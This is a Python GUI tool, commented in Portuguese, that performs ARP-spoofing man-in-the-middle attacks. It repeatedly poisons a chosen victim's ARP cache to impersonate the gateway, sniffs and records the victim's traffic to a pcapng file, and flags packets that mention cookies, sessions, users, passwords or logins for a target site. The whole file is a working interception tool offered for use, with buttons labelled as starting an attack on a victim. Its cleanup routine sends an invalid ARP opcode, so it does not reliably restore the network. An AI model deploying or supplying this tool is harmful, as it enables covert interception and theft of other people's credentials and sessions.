import threading
import time
from scapy.all import ARP, send, IP, TCP, sniff, Ether, srp, PcapWriter
import customtkinter as ctk

# Configurações de Estética da Interface
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

class DeepHatSpooferPro(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("Arpspoof inspector")
        self.geometry("900x800")
        self.is_running = False

        # Variáveis de Controle
        self.target_ip = ""
        self.gateway_ip = ""
        self.site_alvo = ""
        self.pcap_writer = None 
        self.pcap_filename = "resultado.pcapng"

        # --- UI Layout ---
        self.label_title = ctk.CTkLabel(self, text="Arpspoof inspector", font=("Roboto", 28, "bold"))
        self.label_title.pack(pady=20)

        # Frame de Configurações
        self.config_frame = ctk.CTkFrame(self)
        self.config_frame.pack(pady=10, padx=20)

        self.entry_target = ctk.CTkEntry(self.config_frame, placeholder_text="IP da Vítima (ex: 192.168.0.5)", width=300)
        self.entry_target.grid(row=0, column=0, padx=10, pady=10)

        self.entry_gateway = ctk.CTkEntry(self.config_frame, placeholder_text="IP do Gateway (ex: 192.168.0.1)", width=300)
        self.entry_gateway.grid(row=0, column=1, padx=10, pady=10)

        self.entry_site = ctk.CTkEntry(self.config_frame, placeholder_text="Site Alvo (ex: exemplo.com)", width=300)
        self.entry_site.grid(row=1, column=0, columnspan=2, padx=10, pady=10)

        # Console de Log
        self.label_log = ctk.CTkLabel(self, text="Console de Monitoramento", font=("Roboto", 14))
        self.label_log.pack(pady=(10, 0))
        
        self.log_box = ctk.CTkTextbox(self, width=850, height=450)
        self.log_box.pack(pady=10)
        self.log_box.insert("0.0", "[#] Sistema pronto. Aguardando configurações...\n")

        # Botões de Controle
        self.btn_start = ctk.CTkButton(self, text="INICIAR ATAQUE", command=self.start_attack,
            fg_color="#2ecc71", hover_color="#27ae60", text_color="#000000", font=("Roboto", 14, "bold"))
        self.btn_start.pack(pady=5)

        self.btn_stop = ctk.CTkButton(self, text="PARAR E LIMPAR", command=self.stop_attack,
            fg_color="#e74c3c", hover_color="#c0392b", text_color="#000000", font=("Roboto", 14, "bold"))
        self.btn_stop.pack(pady=5)

    def log(self, message):
        self.log_box.insert("end", f"[!] {message}\n")
        self.log_box.see("end")

    def get_mac(self, ip):
        """Busca o MAC de um IP usando ARP Request"""
        try:
            arp_request = ARP(pdst=ip)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether/arp_request
            ans, _ = srp(packet, timeout=2, verbose=False)
            
            if ans:
                return ans[0][1].hwsrc
            return None
        except Exception as e:
            self.log(f"Erro ao buscar MAC: {str(e)}")
            return None

    def spoof(self, target_ip, gateway_ip, enable=True):
        """Realiza o envenenamento da tabela ARP"""
        target_mac = self.get_mac(target_ip)
        gateway_mac = self.get_mac(gateway_ip)

        if not target_mac or not gateway_mac:
            return

        op = 2 if enable else 0 
        packet = ARP(op=op, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        send(packet, verbose=False)

    def packet_callback(self, packet):
        """Processa pacotes para log e salva no arquivo PCAPNG"""
        # 1. Salva o pacote bruto no arquivo de captura
        if self.pcap_writer:
            try:
                self.pcap_writer.write(packet)
            except Exception:
                pass

        # 2. Lógica de análise de dados (Display na UI)
        if packet.haslayer(IP) and packet.haslayer(TCP):
            payload = str(packet.payload).lower()
            
            if self.site_alvo:
                if self.site_alvo not in payload:
                    return 

            keywords = ["cookie", "session", "user", "pass", "auth", "login"]
            if any(key in payload for key in keywords):
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst
                self.log(f"--- DADOS DETECTADOS ---")
                self.log(f"Origem: {src_ip} -> Destino: {dst_ip}")
                self.log(f"Payload: {payload[:80]}...") 
                self.log(f"------------------------")

    def attack_loop(self):
        """Loop contínuo de spoofing"""
        while self.is_running:
            self.spoof(self.target_ip, self.gateway_ip, True)
            time.sleep(3)

    def start_attack(self):
        if not self.is_running:
            self.target_ip = self.entry_target.get()
            self.gateway_ip = self.entry_gateway.get()
            self.site_alvo = self.entry_site.get().lower().strip()

            if not self.target_ip or not self.gateway_ip:
                self.log("ERRO: Defina o Alvo e o Gateway!")
                return

            self.log(f"Iniciando interceptação em {self.target_ip}...")
            
            # Inicializa o Gravador de PCAP
            try:
                self.pcap_writer = PcapWriter(self.pcap_filename, append=True)
                self.log(f"Gravando tráfego em: {self.pcap_filename}")
            except Exception as e:
                self.log(f"Erro ao criar arquivo de captura: {e}")
                return

            self.is_running = True
            
            # Thread para o Spoofing
            self.attack_thread = threading.Thread(target=self.attack_loop, daemon=True)
            self.attack_thread.start()

            # Thread para o Sniffer (Captura)
            self.sniffer_thread = threading.Thread(target=self.start_sniffer, daemon=True)
            self.sniffer_thread.start()
            
            self.btn_start.configure(state="disabled")
            self.log("STATUS: Ataque Ativo. Monitorando e gravando pacotes...")

    def start_sniffer(self):
        """Inicia a captura de pacotes em segundo plano"""
        sniff(prn=self.packet_callback, stop_filter=lambda x: not self.is_running)

    def stop_attack(self):
        if self.is_running:
            self.is_running = False
            self.log("Parando... Restaurando tabela ARP...")
            
            # Fecha o gravador de pacotes
            if self.pcap_writer:
                self.pcap_writer.close()
                self.pcap_writer = None
                self.log(f"Arquivo {self.pcap_filename} salvo com sucesso.")

            # Limpeza da rede
            for _ in range(3):
                self.spoof(self.target_ip, self.gateway_ip, False)
                time.sleep(1)
            
            self.btn_start.configure(state="normal")
            self.log("STATUS: Ataque Finalizado e Rede Limpa.")
        else:
            self.log("Ataque não está em execução.")

if __name__ == "__main__":
    app = DeepHatSpooferPro()
    app.mainloop()
